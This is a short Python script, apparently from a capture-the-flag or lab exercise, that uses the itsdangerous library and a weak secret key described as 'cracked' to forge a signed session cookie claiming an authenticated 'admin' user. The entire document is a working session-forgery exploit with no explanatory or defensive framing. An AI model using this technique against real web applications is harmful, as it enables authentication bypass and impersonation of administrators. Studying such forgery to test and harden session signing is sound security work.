from itsdangerous import URLSafeTimedSerializer
import base64

secret_key = "10"  # The cracked secret key

# Create the session data
session_data = {
    "authenticated": True,
    "username": "admin"
}

# Initialize the serializer
serializer = URLSafeTimedSerializer(secret_key)

# Generate the signed cookie
session_cookie = serializer.dumps(session_data)

print(f"Forged session cookie: {session_cookie}")
